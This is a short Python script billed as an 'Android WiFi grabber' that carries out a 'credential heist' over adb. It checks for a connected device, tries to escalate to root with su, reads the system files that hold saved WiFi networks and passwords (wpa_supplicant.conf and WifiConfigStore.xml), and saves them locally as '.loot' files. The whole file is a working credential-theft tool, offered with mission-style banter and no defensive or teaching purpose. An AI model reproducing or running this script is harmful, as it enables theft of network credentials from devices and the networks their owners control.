import subprocess
import os
import sys
import time

# DUDE'S ANDROID WIFI GRABBER
# Targets: /data/misc/wifi/wpa_supplicant.conf
#          /data/misc/apexdata/com.android.wifi/WifiConfigStore.xml

def run_adb(cmd):
    try:
        result = subprocess.run(f"adb shell {cmd}", shell=True, capture_output=True, text=True)
        return result.stdout.strip()
    except Exception as e:
        return str(e)

def dude_grab():
    print("[*] DUDE: Initializing WiFi Credential Heist...")
    
    # Check connection
    devices = subprocess.run("adb devices", shell=True, capture_output=True, text=True).stdout
    # Very basic check if any line ends with 'device'
    device_connected = False
    for line in devices.splitlines():
        if line.endswith("\tdevice"):
            device_connected = True
            break
            
    if not device_connected:
        print("[!] DUDE: No device found! Plug it in, rookie.")
        return

    # Check Root
    # We try to run 'id'
    uid = run_adb("id -u")
    use_su = False
    
    if "cannot" in uid.lower() or "permission" in uid.lower() or (uid.isdigit() and int(uid) != 0):
        print("[!] DUDE: Not running as root directly.")
        print("[*] DUDE: Attempting to escalate with 'su'...")
        # Check if we can run su
        su_check = run_adb("su -c id -u")
        if "0" in su_check:
            print("[+] DUDE: Root access confirmed via 'su'.")
            use_su = True
        else:
            print("[-] DUDE: Failed to get root. Cannot grab system WiFi configs.")
            print("[-] DUDE: Aborting mission.")
            return
    else:
        print("[+] DUDE: We have root shell access.")

    print("[*] DUDE: Hunting for configs...")
    
    paths = [
        "/data/misc/wifi/wpa_supplicant.conf",
        "/data/misc/apexdata/com.android.wifi/WifiConfigStore.xml"
    ]
    
    found = False
    for p in paths:
        cmd = f"cat {p}"
        if use_su:
            cmd = f"su -c '{cmd}'"
            
        content = run_adb(cmd)
        
        if "ssid" in content.lower() or "wificonfiguration" in content:
            print(f"[+] DUDE: Found payload at {p}")
            filename = "dude_wifi_" + os.path.basename(p) + ".loot"
            with open(filename, "w") as f:
                f.write(content)
            print(f"[+] DUDE: Saved to local file: {filename}")
            found = True
        else:
            print(f"[-] DUDE: Nothing interesting at {p} (or access denied)")

    if found:
        print("\n[+] DUDE: Mission Complete. WiFi keys secured.")
    else:
        print("\n[-] DUDE: Mission Failed. No keys found.")

if __name__ == "__main__":
    dude_grab()
